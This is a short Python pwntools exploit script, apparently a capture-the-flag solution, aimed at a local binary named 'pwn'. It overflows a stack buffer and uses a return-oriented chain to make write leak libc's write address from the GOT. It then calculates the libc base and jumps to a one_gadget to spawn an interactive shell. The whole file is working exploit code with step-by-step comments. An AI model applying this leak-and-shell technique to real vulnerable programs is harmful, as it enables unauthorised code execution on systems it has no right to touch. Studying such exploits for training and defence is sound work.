#!/usr/bin/python3
from pwn import *
import struct
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
elf = context.binary = ELF("./pwn", checksec=False)
libc = ELF('./glibc/libc.so.6')
padding = b"\x90"*72 # To Offset
pop_rsi_r15 = 0x400741
p = elf.debug()

ELF_LOADED = ELF('./pwn')
MAIN_PLT = ELF_LOADED.symbols['main']
WRITE_PLT = p64(elf.plt.write)
WRITE_GOT = p64(elf.got.write)

# required to pop WRITE_GOT into RSI (write buffer arg) 
# stores a pointer to libcs write function
# padding because we have to pop something into r15 as well because of the gadget
# jump to write call (registers now set up to execute write(1,WRITE_GOT, 0x15))
# jump back to main and restart
payload = padding+p64(pop_rsi_r15)+WRITE_GOT+b"\x90"*8+WRITE_PLT+p64(0x40064a) 

p.readuntil(b'current status: ')
p.sendline(payload)

p.read(0x15)
leaked_address = u64(p.read(8))
print(leaked_address)
libc_base = leaked_address-0x1100f0
one_gadget = libc_base+0x4f302

payload2 = padding + p64(one_gadget) # jump to one_gadget and get shell
p.sendline(payload2)
p.interactive()